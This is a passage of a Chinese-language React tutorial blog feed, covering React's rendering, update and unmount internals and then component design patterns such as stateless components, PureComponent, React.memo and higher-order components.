language_">this</span>,</span><br><span class="line">        rootID,</span><br><span class="line">        container,</span><br><span class="line">        transaction</span><br><span class="line">      );</span><br><span class="line">      <span class="title class_">ReactComponent</span>.<span class="property">ReactReconcileTransaction</span>.<span class="title function_">release</span>(transaction);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><br />React 团队将其从后端领域借鉴到前端是因为事务的设计有以下优势。<br />● <strong>原子性</strong>: 事务作为一个整体被执行，要么全部被执行，要么都不执行。<br />● <strong>隔离性</strong>: 多个事务并发执行时，一个事务的执行不应影响其他事务的执行。<br />● <strong>一致性</strong>: 相同的输入，确定能得到同样的执行结果。</p><p>上面提到的事务会调用 <code>ReactCompositeComponent.mountComponent</code> 函数进入 React 组件生命周期，它的源码大致是这样的。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (inst.<span class="property">componentWillMount</span>) &#123;</span><br><span class="line">    inst.<span class="title function_">componentWillMount</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_pendingStateQueue</span>) &#123;</span><br><span class="line">        inst.<span class="property">state</span> = <span class="variable language_">this</span>.<span class="title function_">_processPendingState</span>(inst.<span class="property">props</span>, inst.<span class="property">context</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />首先会判断是否有 <code>componentWillMount</code>，然后初始化 state 状态。当 state 计算完毕后，就会调用在 App 组件中声明的 render 函数。接着 render 返回的结果，会处理为新的 React Element，再走一遍上面提到的流程，不停地往下解析，逐步递归，直到开始处理 HTML 元素。到这里 App 组件就完成了首次渲染。</p><p><a name="soBQm"></a></p><h3 id="（4）更新"><a href="#（4）更新" class="headerlink" title="（4）更新"></a>（4）更新</h3><p>在 <code>setState</code> 时会调用 <code>Component</code> 类中的 <code>enqueueSetState</code> 函数。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">updater</span>.<span class="title function_">enqueueSetState</span>(<span class="variable language_">this</span>, partialState)</span><br></pre></td></tr></table></figure><p>在执行 <code>enqueueSetState</code> 后，会调用 <code>ReactCompositeComponent</code> 实例中的<code>_pendingStateQueue</code>，将新的状态变更加入实例的等待更新状态队列中，再调用<code>ReactUpdates</code> 模块中的 <code>enqueueUpdate</code> 函数执行更新。这个过程会检查更新是否已经在进行中：<br />● 如果是，则把组件加入 <code>dirtyComponents</code> 中；<br />● 如果不是，先初始化更新事务，然后把组件加入 <code>dirtyComponents</code> 列表。</p><p>这里的初始化更新事务，就是 setState 一讲中提到的 <code>batchingstrategy.isBatchingUpdates</code> 开关。接下来就会在更新事务中处理所有记录的 <code>dirtyComponents</code>。</p><p><a name="YXRbL"></a></p><h3 id="（5）卸载"><a href="#（5）卸载" class="headerlink" title="（5）卸载"></a>（5）卸载</h3><p>对于自定义组件，也就是对 <code>ReactCompositeComponent</code> 而言，卸载过程需要递归地调用生命周期函数。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CompositeComponent</span>&#123;</span><br><span class="line">  <span class="title function_">unmount</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> publicInstance = <span class="variable language_">this</span>.<span class="property">publicInstance</span></span><br><span class="line">    <span class="keyword">if</span>(publicInstance)&#123;</span><br><span class="line">      <span class="keyword">if</span>(publicInstance.<span class="property">componentWillUnmount</span>)&#123;</span><br><span class="line">        publicInstance.<span class="title function_">componentWillUnmount</span>()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> renderedComponent = <span class="variable language_">this</span>.<span class="property">renderedComponent</span></span><br><span class="line">    renderedComponent.<span class="title function_">unmount</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而对于 <code>ReactDOMComponent</code> 而言，卸载子元素需要清除事件监听器并清理一些缓存。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DOMComponent</span>&#123;</span><br><span class="line">  <span class="title function_">unmount</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> renderedChildren = <span class="variable language_">this</span>.<span class="property">renderedChildren</span></span><br><span class="line">    renderedChildren.<span class="title function_">forEach</span>(<span class="function"><span class="params">child</span> =&gt;</span> child.<span class="title function_">unmount</span>())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么到这里，卸载的过程就算完成了。</p><p>从以上的流程中我们可以看出，React 渲染的整体策略是<strong>递归</strong>，并通过<strong>事务</strong>建立 React 与虚拟 DOM 的联系并完成调度。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 组件设计模式</title>
      <link href="/2023/07/27/frontend/react/react-zu-jian-she-ji-mo-shi/"/>
      <url>/2023/07/27/frontend/react/react-zu-jian-she-ji-mo-shi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>在 React 设计模式中，最重要、也是最为大家所津津乐道的几个模式分别是：<br />● 有状态组件与无状态组件<br />● 高阶组件（HOC）<br />● Render Props</p><p>这些形态各异的 React 设计模式虽然实现思路有所不同，但本质上基本都是为了实现这样一个终极目标——以尽可能优雅的姿态，实现组件逻辑的复用。下面就来看看这些设计模式。</p><p><a name="Wqa7e"></a></p><h2 id="1-有状态组件和无状态组件"><a href="#1-有状态组件和无状态组件" class="headerlink" title="1. 有状态组件和无状态组件"></a>1. 有状态组件和无状态组件</h2><p><a name="ektmL"></a></p><h3 id="（1）概念"><a href="#（1）概念" class="headerlink" title="（1）概念"></a>（1）概念</h3><p>在 React 应用中，最简单也是最常用的一种组件模式，就是<strong>有状态组件和无状态组件</strong>。这种模式的本质就是：<strong>把一个功能分配到两个组件中，形成父子关系，外层的父组件负责管理数据状态，内层的子组件只负责展示。</strong></p><p><strong>那为什么要分割有状态组件和无状态组件呢？</strong><br />软件设计中有一个原则，叫做“<strong>责任分离</strong>”（Separation of Responsibility），简单说就是让一个模块的责任尽量少，如果一个模块功能过多，就应该拆分为多个模块，让一个模块都专注于一个功能，这样更利于代码的维护。</p><p>使用 React 来做界面，无外乎就是获得驱动界面的数据，然后利用这些数据来渲染界面。当然，可以这些可以在一个组件中搞定，但是，最好把获取和管理数据这件事和界面渲染这件事分开。做法就是，<strong>把获取和管理数据的逻辑放在父组件，也就是有状态组件；把渲染界面的逻辑放在子组件，也就是无状态组件。</strong></p><p>这么做的好处就是可以灵活地修改数据状态管理方式，比如，最初可能用 Redux 来管理数据，然后想要修改为用 Mobx，如果按照这种模式分割组件，需要改的只有有状态组件，无状态组件可以保持原状。</p><p><a name="ACM3i"></a></p><h3 id="（2）示例"><a href="#（2）示例" class="headerlink" title="（2）示例"></a>（2）示例</h3><p>下面来实现一个显示“随机笑话”的功能，所谓“随机笑话”，就是需要从服务器获取随机的一个笑话，展示在页面上。功能可以分为两部分，第一部分是展示，也就是无状态组件，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">SmileFace</span> <span class="keyword">from</span> <span class="string">&#x27;./simile.png&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Joke</span> = (<span class="params">&#123;value&#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;SmileFace&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;value || &#x27;loading...&#x27; &#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />无状态组件 Joke 的功能很简单，显示一个笑脸，然后显示名为 <code>value</code> 的 <code>props</code>，也就是笑话的内容，如果没有 <code>value</code> 值，就显示一个“loading…”。至于如何获得笑话内容，不是 Joke 的事，它只专注于显示笑话，免去了数据管理的烦恼。</p><p>然后是有状态组件，这个组件不用管渲染的逻辑，只负责拿到数据，然后把数据传递给无状态组件，由无状态组件来完成渲染。代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">RandomJoke</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    <span class="attr">joke</span>: <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Joke</span> <span class="attr">value</span>=<span class="string">&#123;this.state.joke&#125;</span> /&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">componentDidMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://icanhazdadjoke.com/&#x27;</span>,</span><br><span class="line">      &#123;<span class="attr">headers</span>: &#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;&#125;</span><br><span class="line">    ).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">json</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;<span class="attr">joke</span>: json.<span class="property">joke</span>&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />可以看到，<code>RandomJoke</code> 的 <code>render</code> 函数只做一件事，就是渲染 <code>Joke</code>，并把 <code>this.state</code> 中的值作为 <code>props</code> 传进去。有状态组件的 <code>render</code> 函数一般都很简单，因为渲染不是他们的业务，它们的主业是获取数据。</p><p><code>RandomJoke</code> 获取数据的方法是在 <code>componentDidMount</code> 函数中调用一个 API，这个 API 随即返回一个英文笑话。当 <code>RandomJoke</code> 被第一次渲染的时候，它的 <code>state</code> 中的 <code>joke</code> 值为 <code>null</code>，所以它传给 <code>Joke</code> 的 <code>value</code> 也是 <code>null</code>，这时候，<code>Joke</code> 会渲染一 “loading…”。在第一次渲染完毕的时候，<code>componentDidMount</code> 被调用，一个 API 请求发出去，拿到一个随机笑话，更新 <code>state</code> 中的值。因为对一个组件 <code>state</code> 的更新会引发一个新的渲染过程，所以 <code>RandomJoke</code> 的 <code>render</code> 再一次被调用，所以 <code>Joke</code> 也会再一次被渲染，笑话也就出现了。</p><p>最终类似这样：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612605034257-fb934d59-70ea-49e9-ab16-817a7e67c7af.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612605034257-fb934d59-70ea-49e9-ab16-817a7e67c7af.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>应用这种方法之后，如果要优化界面，只需要去修改无状态组件 <code>Joke</code>，如果想改进数据管理和获取，只需要去修改有状态组件 <code>RandomJoke</code>。如此一来，维护工作就简单多了，甚至可以把两个组件分配各两个不同的开发者去维护开发。如果应用 <code>Redux</code> 或 <code>Mobx</code>，也会应用到这种模式。</p><p><a name="CZh2E"></a></p><h3 id="（3）PureComponent"><a href="#（3）PureComponent" class="headerlink" title="（3）PureComponent"></a>（3）PureComponent</h3><p>因为无状态组件没有自己的状态，所以，可以像上面的 <code>Joke</code> 一样实现为函数形式，其实可以进一步改进，利用 <code>PureComponent</code> 来提高无状态组件的性能。函数形式的 React 组件，好处是不需要管理 <code>state</code>，占用资源少，但是，函数形式的组件无法利用 <code>shouldComponentUpdate</code>。</p><p>看上面的例子，当 <code>RandomJoke</code> 要渲染 <code>Joke</code> 时，即使传入的 <code>props</code> 是一模一样的，<code>Joke</code> 也要走一遍完整的渲染过程，这就显得浪费了。好一点的方法，是把 <code>Joke</code> 实现为一个类，而且定义 <code>shouldComponentUpdate</code> 函数，每次渲染过程中，在 <code>render</code> 函数执行之前 <code>shouldComponentUpdate</code> 会被调用，如果返回 true，那就继续，如果返回 false，那么渲染过程立刻停止，因为这代表不需要重新渲染了。</p><p>对于无状态组件，因为逻辑很简单，界面完全由 <code>props</code> 决定，所以 <code>shouldComponentUpdate</code> 的实现方式就是比较这次渲染的 <code>props</code> 是否和上一次 <code>props</code> 相同。当然，让每一个组件都实现一遍这样简单的 <code>shouldComponentUpdate</code> 也很浪费，所以，React 提供了一个简单的实现工具 <code>PureComponent</code>，可以满足绝大部分需求。</p><p>改进后的 Joke 组件如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Joke</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.PureComponent</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;SmileFace&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;this.props.value || &#x27;loading...&#x27; &#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />注意：<code>PureComponent</code> 中 <code>shouldComponentUpdate</code> 对 <code>props</code> 做得只是浅层比较，不是深层比较，如果 <code>props</code> 是一个深层对象，就容易产生问题。比如，两次渲染传入的某个 <code>props</code> 都是同一个对象，但是对象中某个属性的值不同，这在 <code>PureComponent</code> 眼里，<code>props</code> 没有变化，不会重新渲染，但是这明显不是我们想要的结果。</p><p><a name="EWYAJ"></a></p><h3 id="（4）React-memo"><a href="#（4）React-memo" class="headerlink" title="（4）React.memo"></a>（4）React.memo</h3><p>虽然 <code>PureComponent</code> 可以提高组件渲染性能，但是它迫使我们必须把组件实现为 <code>class</code>，不能用纯函数来实现组件。如果使用 <code>React v16.6.0</code> 之后的版本，可以使用一个新功能 <code>React.memo</code> 来完美实现 React 组件，上面的 <code>Joke</code> 组件可以这么写：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Joke</span> = <span class="title class_">React</span>.<span class="title function_">memo</span>(<span class="function">() =&gt;</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;SmileFace&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;this.props.value || &#x27;loading...&#x27; &#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">));</span><br></pre></td></tr></table></figure><p><br /><code>React.memo</code> 既利用了 <code>shouldComponentUpdate</code>，又不要求写一个 <code>class</code>，这也体现出 React 逐步向完全函数式编程前进。</p><p><a name="V10dc"></a></p><h2 id="2-高阶组件"><a href="#2-高阶组件" class="headerlink" title="2. 高阶组件"></a>2. 高阶组件</h2><p>在开发 React 组件过程中，很容易发现这样一种现象，某些功能是多个组件通用的，如果每个组件都重复实现这样的逻辑，肯定十分浪费，而且违反了“不要重复自己”（DRY，Don’t Repeat Yourself)的编码原则，需要把这部分共用逻辑提取出来重用。</p><p>在 React 的世界里，组件是第一公民，首先想到的是当然是把共用逻辑提取为一个 React 组件。不过，有些情况下，这些共用逻辑无法成为一个独立组件，换句话说，这些共用逻辑单独无法使用，它们只是对其他组件的功能加强。</p><p>举个例子，对于很多网站应用，有些模块都需要在用户已经登录的情况下才显示。比如，对于一个电商类网站，“退出登录”按钮、“购物车”这些模块，就只有用户登录之后才显示，对应这些模块的 React 组件如果连“只有在登录时才显示”的功能都重复实现，那就浪费了。<br />这时候就可以利用“高阶组件（HoC）”这种模式来解决问题。</p><p><a name="L2h6G"></a></p><h3 id="（1）基本形式"><a href="#（1）基本形式" class="headerlink" title="（1）基本形式"></a>（1）基本形式</h3><p>React 官方岁高阶组件的解释：</p><blockquote><p>高阶组件（HOC）是 React 中用于复用组件逻辑的一种高级技巧。HOC 自身不是 React API 的一部分，它是一种基于 React 的组合特性而形成的设计模式。</p></blockquote><p>“高阶组件”名为“组件”，其实并不是一个组件，而是一个函数，只不过这个函数比较特殊，它接受至少一个 <strong>React 组件</strong>为参数，并且能够返回一个全新的 React 组件作为结果，当然，这个新产生的 React 组件是对作为参数的组件的包装，所以，可以赋予新组件一些增强的“神力”。一个简单的高阶组件是这样的形式：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">withDoNothing</span> = (<span class="params">Component</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">NewComponent</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Component</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">NewComponent</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />上面的函数 <code>withDoNothing</code> 就是一个高阶组件，作为一项业界通用的代码规范，高阶组件的命名一般都带 <strong>with 前缀</strong>，命名中后面的部分代表这个高阶组件的功能。就如同 <code>withDoNothing</code> 这个名字所说的一样，这个高阶组件什么都没做，但是从中可以看出高阶组件的基本代码套路：<br />● 高阶组件不能去修改作为参数的组件，高阶组件必须是一个纯函数，不应该有任何副作用。<br />● 高阶组件返回的结果必须是一个新的 React 组件，这个新的组件的 JSX 部分肯定会包含作为参数的组件。<br />● 高阶组件一般需要把传给自己的 props 转手传递给作为参数的组件。</p><p><a name="EmCWQ"></a></p><h3 id="（2）抽取共同逻辑"><a href="#（2）抽取共同逻辑" class="headerlink" title="（2）抽取共同逻辑"></a>（2）抽取共同逻辑</h3><p>下面对 <code>withDoNothing</code> 进行一些改进，让它实现“只有在登录时才显示”这个功能。假设已经有一个函数 <code>getUserId</code> 能够从 <code>cookies</code> 中读取登录用户的 ID，如果用户未登录，这个 <code>getUserId</code> 就返回空，那么“退出登录按钮“就需要这么写：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">LogoutButton</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">getUserId</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> ...; <span class="comment">// 显示”退出登录“的JSX</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />购物车的代码就是这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ShoppintCart</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">getUserId</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> ...; <span class="comment">// 显示”购物车“的JSX</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />上面两个组件明显有重复的代码，可以把重复代码抽取出来，形成 <code>withLogin</code> 这个高阶组件，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">withLogin</span> = (<span class="params">Component</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">NewComponent</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">getUserId</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Component</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">NewComponent</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />这样，就只需要这样定义 <code>LogoutButton</code> 和 <code>ShoppintCart</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">LogoutButton</span> = <span class="title function_">withLogin</span>(<span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> ...; <span class="comment">// 显示”退出登录“的JSX</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ShoppingCart</span> = <span class="title function_">withLogin</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> ...; <span class="comment">// 显示”购物车“的JSX</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br />这样就避免了重复代码，以后如果要修改对用户是否登录的判断逻辑，也只需要修改 <code>withLogin</code>，而不用修改每个 React 组件。</p><p><a name="XRsBA"></a></p><h3 id="（3）高级用法"><a href="#（3）高级用法" class="headerlink" title="（3）高级用法"></a>（3）高级用法</h3><p>高阶组件只需要返回一个 React 组件即可，我们可以传入多个 React 组件给高阶组件。</p><p>比如，可以改进上面的 <code>withLogin</code>，让它接受两个 React 组件，根据用户是否登录选择渲染合适的组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">withLoginAndLogout</span> = (<span class="params">ComponentForLogin, ComponentForLogout</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">NewComponent</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">getUserId</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">ComponentForLogin</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml">&lt;ComponentForLogout&#123;...props&#125; /&gt;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">NewComponent</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />有了 withLoginAndLogout，就可以产生根据用户登录状态显示不同的内容：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">TopButtons</span> = <span class="title function_">withLoginAndLogout</span>(</span><br><span class="line">  <span class="title class_">LogoutButton</span>,</span><br><span class="line">  <span class="title class_">LoginButton</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="PorEx"></a></p><h3 id="（4）链式调用"><a href="#（4）链式调用" class="headerlink" title="（4）链式调用"></a>（4）链式调用</h3><p>高阶组件最巧妙的一点就是可以链式调用。假设，有三个高阶组件分别是 <code>withOne</code>、<code>withTwo</code> 和 <code>withThree</code>，那么，如果要赋予一个组件 <code>X</code> 某个高阶组件的超能力，那么要做的就是挨个使用高阶组件包装，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">X1</span> = <span class="title function_">withOne</span>(X);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">X2</span> = <span class="title function_">withTwo</span>(<span class="variable constant_">X1</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">X3</span> = <span class="title function_">withThree</span>(<span class="variable constant_">X2</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">SuperX</span> = <span class="variable constant_">X3</span>; <span class="comment">//最终的SuperX具备三个高阶组件的超能力</span></span><br></pre></td></tr></table></figure><p><br />可以避免使用中间变量 <code>X1</code> 和 <code>X2</code>，直接连续调用高阶组件，如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">SuperX</span> = <span class="title function_">withThree</span>(<span class="title function_">withTwo</span>(<span class="title function_">withOne</span>(X)));</span><br></pre></td></tr></table></figure><p><br />对于 <code>X</code> 而言，它被高阶组件包装了，至于被一个高阶组件包装，还是被 N 个高阶组件包装，没有什么差别。而高阶组件本身就是一个纯函数，纯函数是可以组合使用的，所以，可以把多个高阶组件组合为一个高阶组件，然后用这一个高阶组件去包装<code>X</code>，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hoc = <span class="title function_">compose</span>(withThree, withTwo, 